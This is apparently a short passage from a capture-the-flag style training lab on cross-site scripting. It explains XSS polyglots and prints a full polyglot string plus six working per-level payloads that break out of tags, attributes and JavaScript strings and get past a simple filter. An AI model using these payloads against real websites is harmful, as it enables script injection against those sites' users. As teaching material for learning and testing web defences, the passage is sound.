# Perfecting your payload
## Polyglots
An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six levels you've just completed, and it would have executed the code successfully.

```js
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

```js
// Level 1:
<script>alert('THM');</script> 
// Level 2:
"><script>alert('THM');</script> 
// Level 3:
</textarea><script>alert('THM');</script> 
// Level 4:
';alert('THM');// 
// Level 5:
<sscriptcript>alert('THM');</sscriptcript> 
// Level 6:
/images/cat.jpg" onload="alert('THM');
```